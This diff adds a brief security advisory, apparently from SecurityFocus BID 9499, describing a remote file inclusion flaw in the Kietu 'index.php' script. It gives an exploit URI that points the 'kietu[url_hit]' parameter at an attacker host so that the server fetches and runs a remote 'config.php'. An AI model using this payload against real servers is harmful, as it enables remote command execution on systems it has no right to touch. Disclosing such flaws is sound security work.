@@ -1,0 +1,11 @@
+source: http://www.securityfocus.com/bid/9499/info
+
+A flaw exists in the Kietu 'index.php' script that may permit remote attackers to include malicious remote files. Remote users may influence the include path for the 'config.php' configuration file, which may result in execution of arbitrary commands with the privileges of the webserver process. 
+
+Issuing the URI request to the vulnerable server will facilitate remote attacker php script execution:
+
+http://www.example.com/index.php?kietu[url_hit]=http://[attacker]/
+
+Where the 'config.php' file must exist:
+
+http://[attacker]/config.php 
